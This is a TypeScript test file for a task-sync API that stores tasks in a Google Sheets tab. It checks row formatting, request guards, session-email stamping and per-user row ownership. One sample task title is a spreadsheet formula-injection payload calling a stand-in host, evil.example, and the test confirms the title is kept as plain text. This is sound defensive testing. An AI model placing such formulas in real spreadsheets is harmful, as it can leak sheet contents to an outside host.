import assert from 'node:assert/strict';
import { test } from 'node:test';
import { upsertTasks, TASKS_TAB, type Sheets } from '../api/_lib/sheets.ts';
import { handleTaskSync, MAX_TASKS, type TaskSyncDeps } from '../api/_lib/tasks-handler.ts';
import { isNote, type Note } from '../src/lib/notes.ts';
import { TASK_HEADERS, taskRow } from '../src/lib/timing.ts';

const NOW = Date.parse('2026-11-03T13:05:00.000Z');
const at = (hhmm: string) => `2026-11-03T${hhmm}:00.000Z`;
const example: Note = {
  id: 'task-1',
  text: '=IMPORTXML("https://evil.example","//x")',
  tag: 'done',
  quadrant: 'do',
  size: 3,
  createdAt: at('10:00'),
  day: '2026-11-03',
  runs: [
    { s: at('11:00'), e: at('11:20') },
    { s: at('11:30'), e: at('12:00') },
    { s: at('12:10'), e: at('12:40') },
    { s: at('12:50'), e: at('13:00') },
  ],
  spentMs: 90 * 60_000,
};

test("taskRow: the owner's example as a sheet row (formula-looking title kept as plain text)", () => {
  const row = taskRow(example, 'ana@example.com', NOW);
  assert.equal(row.length, TASK_HEADERS.length);
  const byHeader = Object.fromEntries(TASK_HEADERS.map((h, i) => [h, row[i]]));
  assert.deepEqual(byHeader, {
    task_id: 'task-1',
    user_email: 'ana@example.com',
    title: '=IMPORTXML("https://evil.example","//x")',
    quadrant: 'do',
    story_points: '3',
    status: 'done',
    created_at: at('10:00'),
    start_time: at('11:00'),
    end_time: at('13:00'),
    pauses: '3',
    paused_min: '30',
    actual_min: '90',
    span_min: '120',
    actual: '1h 30m',
    span: '2h 00m',
    updated_at: '2026-11-03T13:05:00.000Z',
  });
});

test('taskRow: a task that never ran has blank timing', () => {
  const row = taskRow({ ...example, runs: [], spentMs: 0, tag: 'todo' }, 'a@b.c', NOW);
  assert.deepEqual(row.slice(7, 15), ['', '', '', '', '', '', '', '']);
});

function deps(over: Partial<TaskSyncDeps<Note>> = {}): TaskSyncDeps<Note> & { written: unknown[] } {
  const written: unknown[] = [];
  return {
    configured: true,
    sheetConfigured: true,
    isSameOrigin: () => true,
    readUser: async () => ({ email: 'ana@example.com' }),
    allow: () => true,
    isTask: isNote,
    row: taskRow,
    write: async (email, rows, deletes) => {
      written.push({ email, rows, deletes });
      return { appended: rows.length };
    },
    now: () => NOW,
    written,
    ...over,
  };
}
const post = (body: unknown) => new Request('https://devlog.test/api/tasks', { method: 'POST', body: typeof body === 'string' ? body : JSON.stringify(body) });

test('tasks API: writes rows stamped with the session email, never one from the body', async () => {
  const d = deps();
  const res = await handleTaskSync(post({ upserts: [{ ...example, user_email: 'evil@example.com' }], deletes: [{ id: 'old', at: at('12:00') }] }), d);
  assert.equal(res.status, 200);
  const [call] = d.written as { email: string; rows: string[][]; deletes: unknown[] }[];
  assert.equal(call?.email, 'ana@example.com');
  assert.equal(call?.rows[0]?.[1], 'ana@example.com');
  assert.deepEqual(call?.deletes, [{ id: 'old', at: at('12:00') }]);
});

test('tasks API guards: method, config, cross-site, signed out, busy, sheet missing, size, shape, invalid', async () => {
  const status = async (over: Partial<TaskSyncDeps<Note>>, req: Request = post({ upserts: [example] })) => (await handleTaskSync(req, deps(over))).status;
  assert.equal(await status({}, new Request('https://devlog.test/api/tasks')), 405);
  assert.equal(await status({ configured: false }), 503);
  assert.equal(await status({ isSameOrigin: () => false }), 403);
  assert.equal(await status({ readUser: async () => null }), 401);
  assert.equal(await status({ allow: () => false }), 429);
  assert.equal(await status({ sheetConfigured: false }), 503);
  assert.equal(await status({}, post('x'.repeat(70_000))), 413);
  assert.equal(await status({}, post({ upserts: Array.from({ length: MAX_TASKS + 1 }, () => example) })), 413);
  assert.equal(await status({}, post('{nope')), 400);
  assert.equal(await status({}, post({ upserts: 'all' })), 400);
  assert.equal(await status({}, post({ upserts: [{ id: 1 }] })), 400);
  assert.equal(await status({}, post({ deletes: [{ id: 'x', at: 'yesterday' }] })), 400);
  assert.equal(await status({ write: async () => Promise.reject(new Error('sheets 500')) }), 502);
});

/** An in-memory Tasks tab behind the Sheets interface. */
function memorySheet(rows: string[][]): Sheets & { rows: string[][] } {
  const tab = [[...TASK_HEADERS], ...rows];
  const col = (letter: string) => letter.charCodeAt(0) - 65;
  return {
    rows: tab,
    ensureTab: async () => undefined,
    getValues: async () => tab.slice(1).map((r) => [r[0] ?? '', r[1] ?? '']),
    append: async (_t, add) => void tab.push(...add.map((r) => [...r])),
    batchUpdate: async (data) => {
      for (const d of data) {
        const [, a1] = d.range.split('!') as [string, string];
        const m = a1.match(/^([A-Z])(\d+)/);
        if (!m) continue;
        const r = tab[Number(m[2]) - 1] as string[];
        d.values[0]?.forEach((v, i) => (r[col(m[1] ?? 'A') + i] = v));
      }
    },
  };
}

test('upsertTasks: updates my row, appends a new one, refuses someone else’s, marks deletes; rows never removed', async () => {
  const mine = taskRow(example, 'ana@example.com', NOW);
  const theirs = taskRow({ ...example, id: 'task-2' }, 'bob@example.com', NOW);
  const gone = taskRow({ ...example, id: 'task-3' }, 'ana@example.com', NOW);
  const sheet = memorySheet([mine, theirs, gone]);

  const edited = taskRow({ ...example, text: 'Renamed' }, 'ana@example.com', NOW);
  const fresh = taskRow({ ...example, id: 'task-4' }, 'ana@example.com', NOW);
  const hijack = taskRow({ ...example, id: 'task-2', text: 'Hijacked' }, 'ana@example.com', NOW);
  const result = await upsertTasks(sheet, TASK_HEADERS, 'Ana@Example.com', [edited, fresh, hijack], [
    { id: 'task-3', at: '2026-11-03T14:00:00.000Z' },
    { id: 'task-2', at: '2026-11-03T14:00:00.000Z' },
  ]);

  assert.deepEqual(result, { updated: 1, appended: 1, deleted: 1, refused: 1 });
  assert.equal(sheet.rows[1]?.[2], 'Renamed');
  assert.equal(sheet.rows[2]?.[2], theirs[2], "Bob's row untouched");
  assert.equal(sheet.rows[2]?.[5], 'done', "Bob's row not deleted by Ana");
  assert.deepEqual([sheet.rows[3]?.[5], sheet.rows[3]?.[15]], ['deleted', '2026-11-03T14:00:00.000Z']);
  assert.equal(sheet.rows[4]?.[0], 'task-4');
  assert.equal(sheet.rows.length, 5, `header + 4 rows in ${TASKS_TAB}`);
});
